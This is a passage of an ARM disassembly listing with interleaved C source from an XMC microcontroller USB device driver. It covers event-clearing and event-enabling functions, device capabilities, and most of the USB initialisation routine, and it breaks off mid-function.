 80052b4:	e01e      	b.n	80052f4 <XMC_USBD_ClearEvent+0xb0>
    case (XMC_USBD_EVENT_RESUME):
	  clear.b.wkupintr = 1U;
 80052b6:	7bfb      	ldrb	r3, [r7, #15]
 80052b8:	f043 0380 	orr.w	r3, r3, #128	; 0x80
 80052bc:	73fb      	strb	r3, [r7, #15]
	  break;
 80052be:	e019      	b.n	80052f4 <XMC_USBD_ClearEvent+0xb0>
    case (XMC_USBD_EVENT_REMOTE_WAKEUP):
	  clear.b.wkupintr = 1U;
 80052c0:	7bfb      	ldrb	r3, [r7, #15]
 80052c2:	f043 0380 	orr.w	r3, r3, #128	; 0x80
 80052c6:	73fb      	strb	r3, [r7, #15]
	  break;
 80052c8:	e014      	b.n	80052f4 <XMC_USBD_ClearEvent+0xb0>
    case (XMC_USBD_EVENT_SOF):
	  clear.b.sofintr = 1U;
 80052ca:	7b3b      	ldrb	r3, [r7, #12]
 80052cc:	f043 0308 	orr.w	r3, r3, #8
 80052d0:	733b      	strb	r3, [r7, #12]
	  break;
 80052d2:	e00f      	b.n	80052f4 <XMC_USBD_ClearEvent+0xb0>
    case (XMC_USBD_EVENT_EARLYSUSPEND):
	  clear.b.erlysuspend = 1U;
 80052d4:	7b7b      	ldrb	r3, [r7, #13]
 80052d6:	f043 0304 	orr.w	r3, r3, #4
 80052da:	737b      	strb	r3, [r7, #13]
	  break;
 80052dc:	e00a      	b.n	80052f4 <XMC_USBD_ClearEvent+0xb0>
    case (XMC_USBD_EVENT_ENUMDONE):
	  clear.b.enumdone = 1U;
 80052de:	7b7b      	ldrb	r3, [r7, #13]
 80052e0:	f043 0320 	orr.w	r3, r3, #32
 80052e4:	737b      	strb	r3, [r7, #13]
	  break;
 80052e6:	e005      	b.n	80052f4 <XMC_USBD_ClearEvent+0xb0>
    case (XMC_USBD_EVENT_OUTEP):
	  clear.b.outepintr = 1U;
 80052e8:	7bbb      	ldrb	r3, [r7, #14]
 80052ea:	f043 0308 	orr.w	r3, r3, #8
 80052ee:	73bb      	strb	r3, [r7, #14]
	  break;
 80052f0:	e000      	b.n	80052f4 <XMC_USBD_ClearEvent+0xb0>
		default:
		break;
 80052f2:	bf00      	nop
	}
	xmc_device.global_register->gintsts = clear.d32;
 80052f4:	4b05      	ldr	r3, [pc, #20]	; (800530c <XMC_USBD_ClearEvent+0xc8>)
 80052f6:	f8d3 31a0 	ldr.w	r3, [r3, #416]	; 0x1a0
 80052fa:	68fa      	ldr	r2, [r7, #12]
 80052fc:	615a      	str	r2, [r3, #20]
}
 80052fe:	bf00      	nop
 8005300:	3714      	adds	r7, #20
 8005302:	46bd      	mov	sp, r7
 8005304:	f85d 7b04 	ldr.w	r7, [sp], #4
 8005308:	4770      	bx	lr
 800530a:	bf00      	nop
 800530c:	20000a84 	.word	0x20000a84

08005310 <XMC_USBD_lClearEventOTG>:

/**
 * Clear the USB OTG events
 **/
static void XMC_USBD_lClearEventOTG(uint32_t event)
{
 8005310:	b480      	push	{r7}
 8005312:	b085      	sub	sp, #20
 8005314:	af00      	add	r7, sp, #0
 8005316:	6078      	str	r0, [r7, #4]
  gotgint_data_t clear = { .d32 = 0U};
 8005318:	2300      	movs	r3, #0
 800531a:	60fb      	str	r3, [r7, #12]
  clear.d32 = event;
 800531c:	687b      	ldr	r3, [r7, #4]
 800531e:	60fb      	str	r3, [r7, #12]
  xmc_device.global_register->gotgint = clear.d32;
 8005320:	4b05      	ldr	r3, [pc, #20]	; (8005338 <XMC_USBD_lClearEventOTG+0x28>)
 8005322:	f8d3 31a0 	ldr.w	r3, [r3, #416]	; 0x1a0
 8005326:	68fa      	ldr	r2, [r7, #12]
 8005328:	605a      	str	r2, [r3, #4]
}
 800532a:	bf00      	nop
 800532c:	3714      	adds	r7, #20
 800532e:	46bd      	mov	sp, r7
 8005330:	f85d 7b04 	ldr.w	r7, [sp], #4
 8005334:	4770      	bx	lr
 8005336:	bf00      	nop
 8005338:	20000a84 	.word	0x20000a84

0800533c <XMC_USBD_ClearEventINEP>:

/**
 * Clear the USB IN EP events
 **/
void XMC_USBD_ClearEventINEP(uint32_t event,const uint8_t ep_num)
{
 800533c:	b480      	push	{r7}
 800533e:	b085      	sub	sp, #20
 8005340:	af00      	add	r7, sp, #0
 8005342:	6078      	str	r0, [r7, #4]
 8005344:	460b      	mov	r3, r1
 8005346:	70fb      	strb	r3, [r7, #3]
  diepint_data_t clear;
  clear.d32 = event;
 8005348:	687b      	ldr	r3, [r7, #4]
 800534a:	60fb      	str	r3, [r7, #12]
  xmc_device.endpoint_in_register[ep_num]->diepint = clear.d32;
 800534c:	78fb      	ldrb	r3, [r7, #3]
 800534e:	4a06      	ldr	r2, [pc, #24]	; (8005368 <XMC_USBD_ClearEventINEP+0x2c>)
 8005350:	336a      	adds	r3, #106	; 0x6a
 8005352:	f852 3023 	ldr.w	r3, [r2, r3, lsl #2]
 8005356:	68fa      	ldr	r2, [r7, #12]
 8005358:	609a      	str	r2, [r3, #8]
}
 800535a:	bf00      	nop
 800535c:	3714      	adds	r7, #20
 800535e:	46bd      	mov	sp, r7
 8005360:	f85d 7b04 	ldr.w	r7, [sp], #4
 8005364:	4770      	bx	lr
 8005366:	bf00      	nop
 8005368:	20000a84 	.word	0x20000a84

0800536c <XMC_USBD_ClearEventOUTEP>:

/**
 * Clear the USB OUT EP events
 **/
void XMC_USBD_ClearEventOUTEP(uint32_t event,const uint8_t ep_num)
{
 800536c:	b480      	push	{r7}
 800536e:	b085      	sub	sp, #20
 8005370:	af00      	add	r7, sp, #0
 8005372:	6078      	str	r0, [r7, #4]
 8005374:	460b      	mov	r3, r1
 8005376:	70fb      	strb	r3, [r7, #3]
  doepint_data_t clear;
  clear.d32 = event;
 8005378:	687b      	ldr	r3, [r7, #4]
 800537a:	60fb      	str	r3, [r7, #12]
  xmc_device.endpoint_out_register[ep_num]->doepint = clear.d32;
 800537c:	78fb      	ldrb	r3, [r7, #3]
 800537e:	4a06      	ldr	r2, [pc, #24]	; (8005398 <XMC_USBD_ClearEventOUTEP+0x2c>)
 8005380:	3370      	adds	r3, #112	; 0x70
 8005382:	009b      	lsls	r3, r3, #2
 8005384:	4413      	add	r3, r2
 8005386:	685b      	ldr	r3, [r3, #4]
 8005388:	68fa      	ldr	r2, [r7, #12]
 800538a:	609a      	str	r2, [r3, #8]
}
 800538c:	bf00      	nop
 800538e:	3714      	adds	r7, #20
 8005390:	46bd      	mov	sp, r7
 8005392:	f85d 7b04 	ldr.w	r7, [sp], #4
 8005396:	4770      	bx	lr
 8005398:	20000a84 	.word	0x20000a84

0800539c <XMC_USBD_EnableEventOUTEP>:

/**
 * Enable the USB OUT EP events
 **/
void XMC_USBD_EnableEventOUTEP(uint32_t event)
{
 800539c:	b480      	push	{r7}
 800539e:	b085      	sub	sp, #20
 80053a0:	af00      	add	r7, sp, #0
 80053a2:	6078      	str	r0, [r7, #4]
	doepint_data_t doepint;
	doepint.d32 = event;
 80053a4:	687b      	ldr	r3, [r7, #4]
 80053a6:	60fb      	str	r3, [r7, #12]
	xmc_device.device_register->doepmsk |= doepint.d32;
 80053a8:	4b07      	ldr	r3, [pc, #28]	; (80053c8 <XMC_USBD_EnableEventOUTEP+0x2c>)
 80053aa:	f8d3 31a4 	ldr.w	r3, [r3, #420]	; 0x1a4
 80053ae:	6959      	ldr	r1, [r3, #20]
 80053b0:	68fa      	ldr	r2, [r7, #12]
 80053b2:	4b05      	ldr	r3, [pc, #20]	; (80053c8 <XMC_USBD_EnableEventOUTEP+0x2c>)
 80053b4:	f8d3 31a4 	ldr.w	r3, [r3, #420]	; 0x1a4
 80053b8:	430a      	orrs	r2, r1
 80053ba:	615a      	str	r2, [r3, #20]
}
 80053bc:	bf00      	nop
 80053be:	3714      	adds	r7, #20
 80053c0:	46bd      	mov	sp, r7
 80053c2:	f85d 7b04 	ldr.w	r7, [sp], #4
 80053c6:	4770      	bx	lr
 80053c8:	20000a84 	.word	0x20000a84

080053cc <XMC_USBD_EnableEventINEP>:

/**
 * Enable the USB IN EP events
 **/
void XMC_USBD_EnableEventINEP(uint32_t event)
{
 80053cc:	b480      	push	{r7}
 80053ce:	b085      	sub	sp, #20
 80053d0:	af00      	add	r7, sp, #0
 80053d2:	6078      	str	r0, [r7, #4]
	diepint_data_t diepint;
	diepint.d32 = event;
 80053d4:	687b      	ldr	r3, [r7, #4]
 80053d6:	60fb      	str	r3, [r7, #12]
	xmc_device.device_register->diepmsk |= diepint.d32;
 80053d8:	4b07      	ldr	r3, [pc, #28]	; (80053f8 <XMC_USBD_EnableEventINEP+0x2c>)
 80053da:	f8d3 31a4 	ldr.w	r3, [r3, #420]	; 0x1a4
 80053de:	6919      	ldr	r1, [r3, #16]
 80053e0:	68fa      	ldr	r2, [r7, #12]
 80053e2:	4b05      	ldr	r3, [pc, #20]	; (80053f8 <XMC_USBD_EnableEventINEP+0x2c>)
 80053e4:	f8d3 31a4 	ldr.w	r3, [r3, #420]	; 0x1a4
 80053e8:	430a      	orrs	r2, r1
 80053ea:	611a      	str	r2, [r3, #16]
}
 80053ec:	bf00      	nop
 80053ee:	3714      	adds	r7, #20
 80053f0:	46bd      	mov	sp, r7
 80053f2:	f85d 7b04 	ldr.w	r7, [sp], #4
 80053f6:	4770      	bx	lr
 80053f8:	20000a84 	.word	0x20000a84

080053fc <XMC_USBD_GetCapabilities>:

/**
 * Gets the USB device capabilities
 **/
XMC_USBD_CAPABILITIES_t XMC_USBD_GetCapabilities()
{
 80053fc:	b480      	push	{r7}
 80053fe:	b083      	sub	sp, #12
 8005400:	af00      	add	r7, sp, #0
  XMC_USBD_CAPABILITIES_t cap={0U};
 8005402:	2300      	movs	r3, #0
 8005404:	607b      	str	r3, [r7, #4]
  cap.event_connect = 1U;
 8005406:	793b      	ldrb	r3, [r7, #4]
 8005408:	f043 0304 	orr.w	r3, r3, #4
 800540c:	713b      	strb	r3, [r7, #4]
  cap.event_disconnect = 1U;
 800540e:	793b      	ldrb	r3, [r7, #4]
 8005410:	f043 0308 	orr.w	r3, r3, #8
 8005414:	713b      	strb	r3, [r7, #4]
#if UC_SERIES == 45
  cap.event_power_off = 1U;
 8005416:	793b      	ldrb	r3, [r7, #4]
 8005418:	f043 0302 	orr.w	r3, r3, #2
 800541c:	713b      	strb	r3, [r7, #4]
  cap.event_power_on = 1U;
 800541e:	793b      	ldrb	r3, [r7, #4]
 8005420:	f043 0301 	orr.w	r3, r3, #1
 8005424:	713b      	strb	r3, [r7, #4]
#else
  cap.event_power_off = 0U;
  cap.event_power_on = 0U;
#endif
  cap.event_high_speed = 0U;
 8005426:	793b      	ldrb	r3, [r7, #4]
 8005428:	f36f 1345 	bfc	r3, #5, #1
 800542c:	713b      	strb	r3, [r7, #4]
  cap.event_remote_wakeup = 1U;
 800542e:	797b      	ldrb	r3, [r7, #5]
 8005430:	f043 0301 	orr.w	r3, r3, #1
 8005434:	717b      	strb	r3, [r7, #5]
  cap.event_reset = 1U;
 8005436:	793b      	ldrb	r3, [r7, #4]
 8005438:	f043 0310 	orr.w	r3, r3, #16
 800543c:	713b      	strb	r3, [r7, #4]
  cap.event_resume = 1U;
 800543e:	793b      	ldrb	r3, [r7, #4]
 8005440:	f043 0380 	orr.w	r3, r3, #128	; 0x80
 8005444:	713b      	strb	r3, [r7, #4]
  cap.event_suspend = 1U;
 8005446:	793b      	ldrb	r3, [r7, #4]
 8005448:	f043 0340 	orr.w	r3, r3, #64	; 0x40
 800544c:	713b      	strb	r3, [r7, #4]
  cap.reserved = 0U;
 800544e:	687b      	ldr	r3, [r7, #4]
 8005450:	f36f 235f 	bfc	r3, #9, #23
 8005454:	607b      	str	r3, [r7, #4]
  return cap;
 8005456:	687b      	ldr	r3, [r7, #4]
}
 8005458:	4618      	mov	r0, r3
 800545a:	370c      	adds	r7, #12
 800545c:	46bd      	mov	sp, r7
 800545e:	f85d 7b04 	ldr.w	r7, [sp], #4
 8005462:	4770      	bx	lr

08005464 <XMC_USBD_Init>:

/**
 * Initializes the USB device
 **/
XMC_USBD_STATUS_t XMC_USBD_Init(XMC_USBD_t *obj)
{
 8005464:	b580      	push	{r7, lr}
 8005466:	b08a      	sub	sp, #40	; 0x28
 8005468:	af00      	add	r7, sp, #0
 800546a:	6078      	str	r0, [r7, #4]
  gintmsk_data_t gintmsk;

  XMC_ASSERT("XMC_USBD_Init: obj.usbd_max_num_eps not of type XMC_USBD_MAX_NUM_EPS_t",
 		      XMC_USBD_CHECK_INPUT_MAX_NUM_EPS(obj->usbd_max_num_eps))
  
  XMC_USBD_Enable();
 800546c:	f7ff fed2 	bl	8005214 <XMC_USBD_Enable>
  
  usbd_init = obj;
 8005470:	4a87      	ldr	r2, [pc, #540]	; (8005690 <XMC_USBD_Init+0x22c>)
 8005472:	687b      	ldr	r3, [r7, #4]
 8005474:	6013      	str	r3, [r2, #0]

  /* Filling out buffer size */
  for(i = 0U;i < (uint32_t)XMC_USBD_NUM_EPS;i++)
 8005476:	2300      	movs	r3, #0
 8005478:	627b      	str	r3, [r7, #36]	; 0x24
 800547a:	e00c      	b.n	8005496 <XMC_USBD_Init+0x32>
  {
	  XMC_USBD_EP_OUT_BUFFERSIZE[i] = XMC_USBD_EP0_BUFFER_SIZE;
 800547c:	4a85      	ldr	r2, [pc, #532]	; (8005694 <XMC_USBD_Init+0x230>)
 800547e:	6a7b      	ldr	r3, [r7, #36]	; 0x24
 8005480:	2140      	movs	r1, #64	; 0x40
 8005482:	f842 1023 	str.w	r1, [r2, r3, lsl #2]
	  XMC_USBD_EP_IN_BUFFERSIZE[i] 	= XMC_USBD_EP0_BUFFER_SIZE;
 8005486:	4a84      	ldr	r2, [pc, #528]	; (8005698 <XMC_USBD_Init+0x234>)
 8005488:	6a7b      	ldr	r3, [r7, #36]	; 0x24
 800548a:	2140      	movs	r1, #64	; 0x40
 800548c:	f842 1023 	str.w	r1, [r2, r3, lsl #2]
  for(i = 0U;i < (uint32_t)XMC_USBD_NUM_EPS;i++)
 8005490:	6a7b      	ldr	r3, [r7, #36]	; 0x24
 8005492:	3301      	adds	r3, #1
 8005494:	627b      	str	r3, [r7, #36]	; 0x24
 8005496:	6a7b      	ldr	r3, [r7, #36]	; 0x24
 8005498:	2b06      	cmp	r3, #6
 800549a:	d9ef      	bls.n	800547c <XMC_USBD_Init+0x18>
  }

  /* clear device status */
  memset((void*)&xmc_device,0x0U,sizeof(XMC_USBD_DEVICE_t));
 800549c:	f44f 7202 	mov.w	r2, #520	; 0x208
 80054a0:	2100      	movs	r1, #0
 80054a2:	487e      	ldr	r0, [pc, #504]	; (800569c <XMC_USBD_Init+0x238>)
 80054a4:	f001 f9de 	bl	8006864 <memset>

  /* assign callbacks */
  xmc_device.DeviceEvent_cb = obj->cb_xmc_device_event;
 80054a8:	687b      	ldr	r3, [r7, #4]
 80054aa:	685b      	ldr	r3, [r3, #4]
 80054ac:	4a7b      	ldr	r2, [pc, #492]	; (800569c <XMC_USBD_Init+0x238>)
 80054ae:	f8c2 3200 	str.w	r3, [r2, #512]	; 0x200
  xmc_device.EndpointEvent_cb = obj->cb_endpoint_event;
 80054b2:	687b      	ldr	r3, [r7, #4]
 80054b4:	689b      	ldr	r3, [r3, #8]
 80054b6:	4a79      	ldr	r2, [pc, #484]	; (800569c <XMC_USBD_Init+0x238>)
 80054b8:	f8c2 3204 	str.w	r3, [r2, #516]	; 0x204
  XMC_USBD_BASE_ADDRESS = (uint8_t *)(obj->usbd);
 80054bc:	687b      	ldr	r3, [r7, #4]
 80054be:	681b      	ldr	r3, [r3, #0]
 80054c0:	623b      	str	r3, [r7, #32]
  /* assign register address */
  xmc_device.global_register = (dwc_otg_core_global_regs_t*)(obj->usbd);
 80054c2:	687b      	ldr	r3, [r7, #4]
 80054c4:	681b      	ldr	r3, [r3, #0]
 80054c6:	4a75      	ldr	r2, [pc, #468]	; (800569c <XMC_USBD_Init+0x238>)
 80054c8:	f8c2 31a0 	str.w	r3, [r2, #416]	; 0x1a0
  xmc_device.device_register = ((dwc_otg_device_global_regs_t*)(XMC_USBD_BASE_ADDRESS + DWC_DEV_GLOBAL_REG_OFFSET));
 80054cc:	6a3b      	ldr	r3, [r7, #32]
 80054ce:	f503 6300 	add.w	r3, r3, #2048	; 0x800
 80054d2:	4a72      	ldr	r2, [pc, #456]	; (800569c <XMC_USBD_Init+0x238>)
 80054d4:	f8c2 31a4 	str.w	r3, [r2, #420]	; 0x1a4
  for (i = 0U;i < (uint32_t)XMC_USBD_NUM_EPS;i++)
 80054d8:	2300      	movs	r3, #0
 80054da:	627b      	str	r3, [r7, #36]	; 0x24
 80054dc:	e00c      	b.n	80054f8 <XMC_USBD_Init+0x94>
  {
    xmc_device.endpoint_in_register[i] = (dwc_otg_dev_in_ep_regs_t*)(XMC_USBD_BASE_ADDRESS + DWC_DEV_IN_EP_REG_OFFSET +
 80054de:	6a7b      	ldr	r3, [r7, #36]	; 0x24
 80054e0:	3348      	adds	r3, #72	; 0x48
 80054e2:	015b      	lsls	r3, r3, #5
 80054e4:	6a3a      	ldr	r2, [r7, #32]
 80054e6:	441a      	add	r2, r3
 80054e8:	496c      	ldr	r1, [pc, #432]	; (800569c <XMC_USBD_Init+0x238>)
 80054ea:	6a7b      	ldr	r3, [r7, #36]	; 0x24
 80054ec:	336a      	adds	r3, #106	; 0x6a
 80054ee:	f841 2023 	str.w	r2, [r1, r3, lsl #2]
  for (i = 0U;i < (uint32_t)XMC_USBD_NUM_EPS;i++)
 80054f2:	6a7b      	ldr	r3, [r7, #36]	; 0x24
 80054f4:	3301      	adds	r3, #1
 80054f6:	627b      	str	r3, [r7, #36]	; 0x24
 80054f8:	6a7b      	ldr	r3, [r7, #36]	; 0x24
 80054fa:	2b06      	cmp	r3, #6
 80054fc:	d9ef      	bls.n	80054de <XMC_USBD_Init+0x7a>
    ((uint32_t)DWC_EP_REG_OFFSET*i));
  }
  for (i = 0U;i < (uint32_t)XMC_USBD_NUM_EPS;i++)
 80054fe:	2300      	movs	r3, #0
 8005500:	627b      	str	r3, [r7, #36]	; 0x24
 8005502:	e00d      	b.n	8005520 <XMC_USBD_Init+0xbc>
  {
    xmc_device.endpoint_out_register[i] = (dwc_otg_dev_out_ep_regs_t*)(XMC_USBD_BASE_ADDRESS +
    									  DWC_DEV_OUT_EP_REG_OFFSET +
 8005504:	6a7b      	ldr	r3, [r7, #36]	; 0x24
 8005506:	3358      	adds	r3, #88	; 0x58
 8005508:	015b      	lsls	r3, r3, #5
 800550a:	6a3a      	ldr	r2, [r7, #32]
 800550c:	441a      	add	r2, r3
    xmc_device.endpoint_out_register[i] = (dwc_otg_dev_out_ep_regs_t*)(XMC_USBD_BASE_ADDRESS +
 800550e:	4963      	ldr	r1, [pc, #396]	; (800569c <XMC_USBD_Init+0x238>)
 8005510:	6a7b      	ldr	r3, [r7, #36]	; 0x24
 8005512:	3370      	adds	r3, #112	; 0x70
 8005514:	009b      	lsls	r3, r3, #2
 8005516:	440b      	add	r3, r1
 8005518:	605a      	str	r2, [r3, #4]
  for (i = 0U;i < (uint32_t)XMC_USBD_NUM_EPS;i++)
 800551a:	6a7b      	ldr	r3, [r7, #36]	; 0x24
 800551c:	3301      	adds	r3, #1
 800551e:	627b      	str	r3, [r7, #36]	; 0x24
 8005520:	6a7b      	ldr	r3, [r7, #36]	; 0x24
 8005522:	2b06      	cmp	r3, #6
 8005524:	d9ee      	bls.n	8005504 <XMC_USBD_Init+0xa0>
    									  ((uint32_t)DWC_EP_REG_OFFSET*i));
  }
  for (i = 0U;i < (uint32_t)XMC_USBD_NUM_TX_FIFOS;i++)
 8005526:	2300      	movs	r3, #0
 8005528:	627b      	str	r3, [r7, #36]	; 0x24
 800552a:	e00c      	b.n	8005546 <XMC_USBD_Init+0xe2>
  {
    xmc_device.fifo[i] = (uint32_t*)(XMC_USBD_BASE_ADDRESS +
    						XMC_USBD_TX_FIFO_REG_OFFSET +
 800552c:	6a7b      	ldr	r3, [r7, #36]	; 0x24
 800552e:	3301      	adds	r3, #1
 8005530:	031b      	lsls	r3, r3, #12
 8005532:	6a3a      	ldr	r2, [r7, #32]
 8005534:	441a      	add	r2, r3
    xmc_device.fifo[i] = (uint32_t*)(XMC_USBD_BASE_ADDRESS +
 8005536:	4959      	ldr	r1, [pc, #356]	; (800569c <XMC_USBD_Init+0x238>)
 8005538:	6a7b      	ldr	r3, [r7, #36]	; 0x24
 800553a:	3378      	adds	r3, #120	; 0x78
 800553c:	f841 2023 	str.w	r2, [r1, r3, lsl #2]
  for (i = 0U;i < (uint32_t)XMC_USBD_NUM_TX_FIFOS;i++)
 8005540:	6a7b      	ldr	r3, [r7, #36]	; 0x24
 8005542:	3301      	adds	r3, #1
 8005544:	627b      	str	r3, [r7, #36]	; 0x24
 8005546:	6a7b      	ldr	r3, [r7, #36]	; 0x24
 8005548:	2b06      	cmp	r3, #6
 800554a:	d9ef      	bls.n	800552c <XMC_USBD_Init+0xc8>
    						(i * XMC_USBD_TX_FIFO_OFFSET));
  }
  /* obj data structure for endpoint 0 */
  /* Done by driver core */
  /* configure ahb details */  
  gahbcfg.d32 = xmc_device.global_register->gahbcfg;
 800554c:	4b53      	ldr	r3, [pc, #332]	; (800569c <XMC_USBD_Init+0x238>)
 800554e:	f8d3 31a0 	ldr.w	r3, [r3, #416]	; 0x1a0
 8005552:	689b      	ldr	r3, [r3, #8]
 8005554:	61fb      	str	r3, [r7, #28]
  gahbcfg.b.glblintrmsk = 1U; /* enable interrupts ( global mask ) */
 8005556:	7f3b      	ldrb	r3, [r7, #28]
 8005558:	f043 0301 	orr.w	r3, r3, #1
 800555c:	773b      	strb	r3, [r7, #28]
  gahbcfg.b.nptxfemplvl_txfemplvl = 1U;
 800555e:	7f3b      	ldrb	r3, [r7, #28]
 8005560:	f043 0380 	orr.w	r3, r3, #128	; 0x80
 8005564:	773b      	strb	r3, [r7, #28]
  if(obj->usbd_transfer_mode == XMC_USBD_USE_DMA)
 8005566:	687b      	ldr	r3, [r7, #4]
 8005568:	7b5b      	ldrb	r3, [r3, #13]
 800556a:	2b00      	cmp	r3, #0
 800556c:	d104      	bne.n	8005578 <XMC_USBD_Init+0x114>
  {
    /* Enable dma if needed */
    gahbcfg.b.dmaenable = 1U; /* enable dma if needed */
 800556e:	7f3b      	ldrb	r3, [r7, #28]
 8005570:	f043 0320 	orr.w	r3, r3, #32
 8005574:	773b      	strb	r3, [r7, #28]
 8005576:	e003      	b.n	8005580 <XMC_USBD_Init+0x11c>
  }
  else
  {
    gahbcfg.b.dmaenable = 0U;
 8005578:	7f3b      	ldrb	r3, [r7, #28]
 800557a:	f36f 1345 	bfc	r3, #5, #1
 800557e:	773b      	strb	r3, [r7, #28]
  }
  xmc_device.global_register->gahbcfg = gahbcfg.d32;
 8005580:	4b46      	ldr	r3, [pc, #280]	; (800569c <XMC_USBD_Init+0x238>)
 8005582:	f8d3 31a0 	ldr.w	r3, [r3, #416]	; 0x1a0
 8005586:	69fa      	ldr	r2, [r7, #28]
 8005588:	609a      	str	r2, [r3, #8]
  /* configure usb details */  
  gusbcfg.d32= xmc_device.global_register->gusbcfg;
 800558a:	4b44      	ldr	r3, [pc, #272]	; (800569c <XMC_USBD_Init+0x238>)
 800558c:	f8d3 31a0 	ldr.w	r3, [r3, #416]	; 0x1a0
 8005590:	68db      	ldr	r3, [r3, #12]
 8005592:	61bb      	str	r3, [r7, #24]
  gusbcfg.b.force_dev_mode = 1U; /* force us into device mode */
 8005594:	7efb      	ldrb	r3, [r7, #27]
 8005596:	f043 0340 	orr.w	r3, r3, #64	; 0x40
 800559a:	76fb      	strb	r3, [r7, #27]
  gusbcfg.b.srpcap = 1U; /* enable session request protocoll */
 800559c:	7e7b      	ldrb	r3, [r7, #25]
 800559e:	f043 0301 	orr.w	r3, r3, #1
 80055a2:	767b      	strb	r3, [r7, #25]
  xmc_device.global_register->gusbcfg = gusbcfg.d32;
 80055a4:	4b3d      	ldr	r3, [pc, #244]	; (800569c <XMC_USBD_Init+0x238>)
 80055a6:	f8d3 31a0 	ldr.w	r3, [r3, #416]	; 0x1a0
 80055aa:	69ba      	ldr	r2, [r7, #24]
 80055ac:	60da      	str	r2, [r3, #12]

  /* Device init */
  /* configure device speed */  
  dcfg.d32 = xmc_device.device_register->dcfg;
 80055ae:	4b3b      	ldr	r3, [pc, #236]	; (800569c <XMC_USBD_Init+0x238>)
 80055b0:	f8d3 31a4 	ldr.w	r3, [r3, #420]	; 0x1a4
 80055b4:	681b      	ldr	r3, [r3, #0]
 80055b6:	617b      	str	r3, [r7, #20]
  dcfg.b.devspd = XMC_USBD_DCFG_DEVSPD_FS;
 80055b8:	7d3b      	ldrb	r3, [r7, #20]
 80055ba:	f043 0303 	orr.w	r3, r3, #3
 80055be:	753b      	strb	r3, [r7, #20]
  dcfg.b.descdma = 0U;
 80055c0:	7dbb      	ldrb	r3, [r7, #22]
 80055c2:	f36f 13c7 	bfc	r3, #7, #1
 80055c6:	75bb      	strb	r3, [r7, #22]
  xmc_device.device_register->dcfg = dcfg.d32;
 80055c8:	4b34      	ldr	r3, [pc, #208]	; (800569c <XMC_USBD_Init+0x238>)
 80055ca:	f8d3 31a4 	ldr.w	r3, [r3, #420]	; 0x1a4
 80055ce:	697a      	ldr	r2, [r7, #20]
 80055d0:	601a      	str	r2, [r3, #0]
  /* configure device functions */  
  dctl.d32 = xmc_device.device_register->dctl;
 80055d2:	4b32      	ldr	r3, [pc, #200]	; (800569c <XMC_USBD_Init+0x238>)
 80055d4:	f8d3 31a4 	ldr.w	r3, [r3, #420]	; 0x1a4
 80055d8:	685b      	ldr	r3, [r3, #4]
 80055da:	613b      	str	r3, [r7, #16]
  dctl.b.sftdiscon = 1U; /* disconnect the device until its connected by the user */
 80055dc:	7c3b      	ldrb	r3, [r7, #16]
 80055de:	f043 0302 	orr.w	r3, r3, #2
 80055e2:	743b      	strb	r3, [r7, #16]
  /* all other config is done by default register value */
  xmc_device.device_register->dctl = dctl.d32;
 80055e4:	4b2d      	ldr	r3, [pc, #180]	; (800569c <XMC_USBD_Init+0x238>)
 80055e6:	f8d3 31a4 	ldr.w	r3, [r3, #420]	; 0x1a4
 80055ea:	693a      	ldr	r2, [r7, #16]
 80055ec:	605a      	str	r2, [r3, #4]
  /* flush the fifos for proper operation */
  XMC_USBD_lFlushTXFifo((uint8_t)0x10U); /* 0x10 == all fifos, see doc */
 80055ee:	2010      	movs	r0, #16
 80055f0:	f7ff f814 	bl	800461c <XMC_USBD_lFlushTXFifo>
  XMC_USBD_lFlushRXFifo();
 80055f4:	f7ff f852 	bl	800469c <XMC_USBD_lFlushRXFifo>
  /* Enable Global Interrupts */
  /* clear interrupt status bits prior to unmasking */
  xmc_device.global_register->gintmsk = 0U; /* disable all interrupts */
 80055f8:	4b28      	ldr	r3, [pc, #160]	; (800569c <XMC_USBD_Init+0x238>)
 80055fa:	f8d3 31a0 	ldr.w	r3, [r3, #416]	; 0x1a0
 80055fe:	2200      	movs	r2, #0
 8005600:	619a      	str	r2, [r3, #24]
  xmc_device.global_register->gintsts = 0xFFFFFFFFU; /* clear all interrupts */
 8005602:	4b26      	ldr	r3, [pc, #152]	; (800569c <XMC_USBD_Init+0x238>)
 8005604:	f8d3 31a0 	ldr.w	r3, [r3, #416]	; 0x1a0
 8005608:	f04f 32ff 	mov.w	r2, #4294967295	; 0xffffffff
 800560c:	615a      	str	r2, [r3, #20]
 
  gintmsk.d32 = 0U;
 800560e:	2300      	movs	r3, #0
 8005610:	60fb      	str	r3, [r7, #12]
  /* enable common interrupts */
  gintmsk.b.modemismatch = 1U;
 8005612:	7b3b      	ldrb	r3, [r7, #12]
 8005614:	f043 0302 	orr.w	r3, r3, #2
 8005618:	733b      	strb	r3, [r7, #12]
  gintmsk.b.otgintr = 1U;
 800561a:	7b3b      	ldrb	r3, [r7, #12]
 800561c:	f043 0304 	orr.w	r3, r3, #4
 8005620:	733b      	strb	r3, [r7, #12]
  gintmsk.b.sessreqintr = 1U;
 8005622:	7bfb      	ldrb	r3, [r7, #15]
 8005624:	f043 0340 	orr.w	r3, r3, #64	; 0x40
 8005628:	73fb      	strb	r3, [r7, #15]
  /* enable device interrupts */
  gintmsk.b.usbreset = 1U;
 800562a:	7b7b      	ldrb	r3, [r7, #13]
 800562c:	f043 0310 	orr.w	r3, r3, #16
 8005630:	737b      	strb	r3, [r7, #13]
  gintmsk.b.enumdone = 1U;
 8005632:	7b7b      	ldrb	r3, [r7, #13]
 8005634:	f043 0320 	orr.w	r3, r3, #32
 8005638:	737b      	strb	r3, [r7, #13]
  gintmsk.b.erlysuspend = 1U;
 800563a:	7b7b      	ldrb	r3, [r7, #13]
 800563c:	f043 0304 	orr.w	r3, r3, #4
 8005640:	737b      	strb	r3, [r7, #13]
  gintmsk.b.usbsuspend = 1U;
 8005642:	7b7b      	ldrb	r3, [r7, #13]
 8005644:	f043 0308 	orr.w	r3, r3, #8
 8005648:	737b      	strb	r3, [r7, #13]
  gintmsk.b.wkupintr = 1U;
 800564a:	7bfb      	ldrb	r3, [r7, #15]
 800564c:	f043 0380 	orr.w	r3, r3, #128	; 0x80
 8005650:	73fb      	strb	r3, [r7, #15]
  gintmsk.b.sofintr = 1U;
 8005652:	7b3b      	ldrb	r3, [r7, #12]
 8005654:	f043 0308 	orr.w	r3, r3, #8
 8005658:	733b      	strb	r3, [r7, #12]
  if(obj->usbd_transfer_mode == XMC_USBD_USE_FIFO)
 800565a:	687b      	ldr	r3, [r7, #4]
 800565c:	7b5b      	ldrb	r3, [r3, #13]
 800565e:	2b01      	cmp	r3, #1
 8005660:	d103      	bne.n	800566a <XMC_USBD_Init+0x206>
  {
    gintmsk.b.rxstsqlvl = 1U;
